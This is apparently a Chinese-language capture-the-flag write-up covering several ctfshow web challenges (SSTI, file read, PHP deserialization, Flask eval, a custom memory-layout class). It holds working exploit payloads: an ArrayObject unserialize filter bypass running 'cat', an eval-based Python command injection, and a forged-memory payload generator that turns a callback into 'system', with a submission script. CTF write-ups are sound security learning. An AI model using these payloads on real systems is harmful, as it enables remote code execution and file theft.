# easy_ssti
	- 打开F12看到信息泄漏，下载源码看到SSTI和对应的WAF函数，把WAF函数丢给fenjing, ok（还顺便给fenjing加了一点新功能）
- # easy_signin
	- 任意文件读取，读index.php即可
- # easy_php
  id:: 64b2aacc-598b-4be7-b7d4-48230820277e
	- [参考](https://blog.csdn.net/m0_64815693/article/details/130038356)
	- 题目：
		- ```php
		  $data = $_GET['1+1>2'];
		  var_dump($data);
		  if(!preg_match("/^[Oa]:[\d]+/i", $data)){
		      echo "start";
		      $o = unserialize($data);
		      var_dump($o);
		  }else{
		      echo "nope";
		  }
		  ```
	- 题目要求反序列化的字符串不能为对象或者关联数组，我们可以使用自定义序列化对象ArrayObject，其反序列化后以C开头
		- ```php
		  $o = new ctfshow();
		  $o -> ctfshow = "cat /f*";
		  $o -> zzz = "a";
		  $a = new ArrayObject([114 => 514]);
		  $a -> o = $o;
		  echo urlencode(serialize($a));
		  ```
	- 对象o在执行wakeup后会立即destruct
- # easy_flask
	- > 做题时发现本题环境貌似不正常，翻了别人的WP发现本来应该是可以正常登陆拿到源代码的，但现在复现时/login/只会返回403，只能靠着别人的WP看源代码
	- 看到源代码，发现``/hello/``存在eval函数，直接利用，payload:
		- ```
		  /hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()
		  ```
- # easy_class
	- 本来以为这题是考察PHP内存结构的，结果只是自定义了一个内存结构用来存储字符串和函数的而已。
	- 思路
		- 通过覆盖neaten伪造内存，从而调用call_user_func实现RCE
	- 伪造内存
		- 通读代码，对主要逻辑分析如下：
			- ```php
			  function main(){
			    // main之前class使用php://memory打开了一块内存$this -> cache
			    // 读取flag 当然没什么用
			    $flag = md5(file_get_contents("/flag"));
			    // 在映射表中添加两个符号，用来指向cache中的两块内存
			    // 注意ctfshow符号在flag的前面
			    $this->define('ctfshow',self::__REF_VAL_SIZE__);
			    $this->define('flag',strlen($flag));
			    // 在映射表中添加一个符号，用来存储一个函数名和其的参数
			    // destruct时会被调用
			    // 所以我们只需要覆盖这个函数名为system就可以实现RCE
			    $this->neaten();
			    // 把flag的md5放进去，当然实际上不存在这个md5
			    $this->fill('flag',$flag);
			    // 把我们的data放进去
			    $this->fill('ctfshow',$_POST['data']);
			    // 实际上没什么用处的比较，可以RCE那RCE就好了
			    if($this->read('ctfshow')===$this->read('flag')){
			      echo $flag;
			    }
			  }
			  ```
		- 观察fill函数和define函数，我们可以知道
			- ref指向的内存块中，一个字符串是这么存储的
				- 20B: ref的名字
				- 2B: 字符串的长度
				- 1B: 0x31
				- 50B: 字符串的值
			- neaten逻辑中，callback函数是这么存储的
				- 20B: 字符串`_clear_`
				- 16B: callback函数的名字
				- 4B: 0x36d
				- 变长：callback的参数，一个字符串
				- 50B: 0填充
		- 稍做修改让代码生成我们想要的payload
		  collapsed:: true
			- ```php
			  <?php
			  /*
			  # -*- coding: utf-8 -*-
			  # @Author: h1xa
			  # @Date:   2023-03-27 10:30:30
			  # @Last Modified by:   h1xa
			  # @Last Modified time: 2023-03-28 09:28:35
			  # @email: h1xa@ctfer.com
			  # @link: https://ctfer.com
			  
			  */
			  namespace ctfshow;
			  
			  
			  class C{
			  
			      const __REF_OFFSET_1_x41 = 0x41;
			      const __REF_OFFSET_2_x7b = 0x7b;
			      const __REF_OFFSET_3_x5b = 0x5b;
			      const __REF_OFFSET_4_x60 = 0x60;
			      const __REF_OFFSET_5_x30 = 0x30;
			      const __REF_OFFSET_6_x5f = 0x5f;
			  
			      const __REF_SIZE__= 20;
			      const __REF_VAL_SIZE__= 50;
			  
			      private $cursor=0;
			      private $cache;
			      private $ref_table=[];
			  
			      
			  
			      function main(){
			          $flag = md5(file_get_contents("/flag"));
			          $this->define('ctfshow',self::__REF_VAL_SIZE__);
			          $this->define('flag',strlen($flag));
			          $this->neaten();
			          $this->fill('flag',$flag);
			          $this->fill('ctfshow',$_POST['data'] ?? "none");
			  
			          $cur = ftell($this -> cache);
			          var_dump($this -> ref_table["ctfshow"]);
			          fseek($this -> cache, $this -> ref_table["ctfshow"] + 23);
			          $data = fread($this -> cache, 194 - $this -> ref_table["ctfshow"]);
			          var_dump(strlen($data));
			          var_dump("payload"."start". base64_encode($data). "payloadend");
			          fseek($this -> cache, $cur);
			          
			          if($this->read('ctfshow')===$this->read('flag')){
			              echo $flag;
			          }
			      }
			  
			      private function fill($ref,$val){
			          // 向对应的ref中填入val，空余处填入x00
			          echo "<br>start fill: " . urlencode($val) . "<br>";
			          rewind($this->cache);
			          fseek($this->cache, $this->ref_table[$ref]+23); // 跳过名字和size
			  
			  
			          $arr = str_split($val);
			          echo("write cursor: ".ftell($this -> cache).", length: " . strlen($val) . ", value: " . urlencode($val) . "<br>");
			  
			          foreach ($arr as $s) {
			              fwrite($this->cache, pack("C",ord($s)));
			          }
			          echo("write none cursor: ".ftell($this -> cache).", length: " . (self::__REF_VAL_SIZE__ - sizeof($arr)));
			  
			          for ($i=sizeof($arr); $i < self::__REF_VAL_SIZE__; $i++) { 
			              fwrite($this->cache, pack("C","\x00"));
			          }
			  
			          $this->cursor= ftell($this->cache);
			      }
			  
			      public static function clear($var){
			          ;
			      }
			  
			      private function neaten(){
			          echo "<br>start neaten<br>";
			  
			          $this->ref_table['_clear_']=$this->cursor;
			          $arr = str_split("_clear_");
			          foreach ($arr as $s) {
			              $this->write(ord($s),"C");
			          }
			          for ($i=sizeof($arr); $i < self::__REF_SIZE__; $i++) { 
			              $this->write("\x00",'C');
			          }
			  
			          // $arr = str_split(__NAMESPACE__."\C::clear");
			          // foreach ($arr as $s) {
			          //     $this->write(ord($s),"C");
			          // }
			          $arr = str_split("system");
			          foreach ($arr as $s) {
			              $this->write(ord($s),"C");
			          }
			          for ($i=sizeof($arr); $i < 16; $i++) { 
			              $this->write("\x00",'C');
			          }
			          $this->write(0x36d,'Q'); // ULL
			          // $this->write(0x30,'C');
			          $arr = str_split($_POST["cmd"] ?? "ls /");
			          foreach ($arr as $s) {
			              $this->write(ord($s),"C");
			          }
			          for ($i=1; $i < self::__REF_SIZE__; $i++) { 
			              $this->write("\x00",'C');
			          }
			  
			  
			      }
			  
			      private function readNeaten(){
			          echo "<br>start readNeaten<br>";
			          rewind($this->cache);
			          fseek($this->cache, $this->ref_table['_clear_']+self::__REF_SIZE__);
			          var_dump(ftell($this->cache));
			          $f = $this->truncation(fread($this->cache, self::__REF_SIZE__-4));
			          var_dump(ftell($this->cache));
			          $t = $this->truncation(fread($this->cache, self::__REF_SIZE__-12));
			          var_dump(ftell($this->cache));
			          $p = $this->truncation(fread($this->cache, self::__REF_SIZE__));
			          var_dump(ftell($this->cache));
			          var_dump($f);
			          var_dump($t);
			          var_dump($p);
			          @call_user_func($f,$p);
			  
			      }
			  
			      private function define($ref,$size){
			          // 将一个ref定义进内存中，其中ref名占用20B
			          echo "<br>start define<br>";
			          $this->checkRef($ref);
			          $r = str_split($ref);
			          $this->ref_table[$ref]=$this->cursor;
			          foreach ($r as $s) {
			              $this->write(ord($s),"C");
			          }
			          for ($i=sizeof($r); $i < self::__REF_SIZE__; $i++) { 
			              $this->write("\x00",'C');
			          }
			  
			          echo "<br>start define - fwrite<br>";
			  
			          fwrite($this->cache,pack("v",$size));
			          fwrite($this->cache,pack("C",0x31));
			          $this->cursor= ftell($this->cache);
			  
			          for ($i=0; $i < $size; $i++) { 
			              $this->write("\x00",'a');
			          }
			          
			      }
			  
			      private function read($ref){
			  
			          if(!array_key_exists($ref,$this->ref_table)){
			              throw new \Exception("Ref not exists!", 1);
			          }
			  
			          if($this->ref_table[$ref]!=0){
			              $this->seekCursor($this->ref_table[$ref]);
			          }else{
			              rewind($this->cache);
			          }
			          
			          $cref = fread($this->cache, 20);
			          $csize = unpack("v", fread($this->cache, 2));
			          $usize = fread($this->cache, 1);
			  
			          $val = fread($this->cache, $csize[1]);
			  
			          return $this->truncation($val);
			  
			          
			      }
			  
			  
			      private function write($val,$fmt){
			          $this->seek();
			          $v = pack($fmt,$val);
			          echo("write cursor: ".$this -> cursor.", length: " . strlen($v) . ", value: " . urlencode($v) . "<br>");
			          fwrite($this->cache,$v);
			          $this->cursor= ftell($this->cache);
			      }
			  
			      private function seek(){
			          // 将fd的指针重置到cursor处
			          rewind($this->cache);
			          fseek($this->cache, $this->cursor);
			      }
			  
			      private function truncation($data){
			  
			          return implode(array_filter(str_split($data),function($var){
			              return $var!=="\x00";
			          }));
			  
			      }
			      private function seekCursor($cursor){
			          rewind($this->cache);
			          fseek($this->cache, $cursor);
			      }
			      private function checkRef($ref){
			          $r = str_split($ref);
			  
			          if(sizeof($r)>self::__REF_SIZE__){
			              throw new \Exception("Refenerce size too long!", 1);
			          }
			  
			          if(is_numeric($r[0]) || $this->checkByte($r[0])){
			              throw new \Exception("Ref invalid!", 1);
			          }
			  
			          array_shift($r);
			  
			          foreach ($r as $s) {
			  
			              if($this->checkByte($s)){
			                  throw new \Exception("Ref invalid!", 1);
			              }
			          }
			      }
			  
			      private function checkByte($check){
			          if(ord($check) <=self::__REF_OFFSET_5_x30 || ord($check) >=self::__REF_OFFSET_2_x7b ){
			              return true;
			          }
			  
			          if(ord($check) >=self::__REF_OFFSET_3_x5b && ord($check) <= self::__REF_OFFSET_4_x60 
			              && ord($check) !== self::__REF_OFFSET_6_x5f){
			              return true;
			          }
			  
			          return false;
			  
			      }
			  
			      function __construct(){
			          $this->cache=fopen("php://memory","wb");
			      }
			  
			      public function __destruct(){
			          $this->readNeaten();
			          fclose($this->cache);
			      }
			  
			  }
			  highlight_file(__FILE__);
			  error_reporting(0);
			  $c = new C;
			  
			  $c->main();
			  
			  ```
		- 将payload提交即可
			- ```python
			  # url = "http://127.0.0.1:8081"
			  url = "http://69ab6266-8284-4be1-b09b-f6d807234ac4.challenge.ctf.show/"
			  r = base_post("http://127.0.0.1:8081/a.php", data = {
			      "cmd": "cat /*"
			  })
			  # f1agaaa
			  result = re.search("payloadstart(.+)payloadend", r.text)
			  payload = result.group(1)
			  payload = enc_dec.base64.b64decode(payload)
			  r = base_post(url, data = {
			      "data": payload
			  })
			  print(r.text)
			  ```